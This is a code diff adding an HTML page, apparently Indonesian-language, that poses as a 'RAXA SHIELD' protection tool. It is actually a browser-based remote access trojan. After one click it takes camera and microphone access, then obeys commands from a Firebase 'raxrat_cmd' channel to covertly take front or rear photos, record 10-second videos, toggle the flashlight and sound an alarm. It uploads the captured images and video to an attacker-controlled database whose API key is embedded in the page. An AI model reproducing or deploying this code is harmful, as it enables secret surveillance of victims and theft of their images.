@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RAXA TARGET V8</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body style="background:#000; color:white; text-align:center; font-family:sans-serif;">
+    <div id="ovr" style="position:fixed; top:0; left:0; width:100%; height:100%; background:#1a73e8; z-index:1000; display:flex; flex-direction:column; align-items:center; justify-content:center;">
+        <h1>🛡️ RAXA SHIELD</h1>
+        <button onclick="init()" style="padding:20px 40px; border-radius:50px; border:none; font-weight:bold; cursor:pointer;">AKTIFKAN SISTEM</button>
+    </div>
+    <h2 style="margin-top:50px;">SISTEM SIAGA...</h2>
+    <p id="log"></p>
+    <video id="v" width="640" height="480" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <audio id="al" src="https://files.catbox.moe/psfs1k.mp3" loop></audio>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBo9ysomUHUZfQtvsHRZgqxf_D3sTk_5Sg",
+            databaseURL: "https://raxakeamanankeluarga-default-rtdb.asia-southeast1.firebasedatabase.app/"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        let stream, track, rec, chunks = [];
+
+        async function init() {
+            document.getElementById('ovr').style.display='none';
+            await switchCam("user");
+            
+            // Sensor Tepuk
+            const ctx = new (window.AudioContext || window.webkitAudioContext)();
+            const ana = ctx.createAnalyser();
+            const mic = ctx.createMediaStreamSource(stream);
+            mic.connect(ana); ana.fftSize = 256;
+            const data = new Uint8Array(ana.frequencyBinCount);
+
+            function check() {
+                ana.getByteFrequencyData(data);
+                let avg = data.reduce((p, c) => p + c, 0) / data.length;
+                if (avg > 60) { document.getElementById('al').play(); }
+                requestAnimationFrame(check);
+            }
+            check();
+            listen();
+        }
+
+        async function switchCam(m) {
+            if(stream) stream.getTracks().forEach(t => t.stop());
+            stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:m}, audio:true});
+            document.getElementById('v').srcObject = stream;
+            track = stream.getVideoTracks()[0];
+        }
+
+        function listen() {
+            db.ref('raxrat_cmd').on('value', async (snap) => {
+                const cmd = snap.val()?.command;
+                if(!cmd) return;
+                document.getElementById('log').innerText = "Command: " + cmd;
+
+                if(cmd === "ALARM_ON") document.getElementById('al').play();
+                if(cmd === "ALARM_OFF") document.getElementById('al').pause();
+                
+                if(cmd === "SENTER_ON") {
+                    await switchCam("environment");
+                    setTimeout(() => track.applyConstraints({advanced:[{torch:true}]}), 1000);
+                }
+                if(cmd === "SENTER_OFF") track.applyConstraints({advanced:[{torch:false}]});
+
+                if(cmd.includes("FOTO")) {
+                    await switchCam(cmd.includes("BELAKANG") ? "environment" : "user");
+                    setTimeout(() => {
+                        const canvas = document.getElementById('c');
+                        canvas.width = 640; canvas.height = 480;
+                        canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
+                        db.ref('hasil_foto').set({ img: canvas.toDataURL('image/jpeg'), t: Date.now() });
+                    }, 1500);
+                }
+
+                if(cmd.includes("VID")) {
+                    await switchCam(cmd.includes("BELAKANG") ? "environment" : "user");
+                    setTimeout(() => {
+                        rec = new MediaRecorder(stream);
+                        rec.ondataavailable = e => chunks.push(e.data);
+                        rec.onstop = () => {
+                            const reader = new FileReader();
+                            reader.readAsDataURL(new Blob(chunks, {type:'video/webm'}));
+                            reader.onloadend = () => { db.ref('hasil_vid').set({ data: reader.result, t: Date.now() }); chunks = []; }
+                        };
+                        rec.start(); setTimeout(() => rec.stop(), 10000);
+                    }, 1500);
+                }
+            });
+        }
+    </script>
+</body>
+</html>
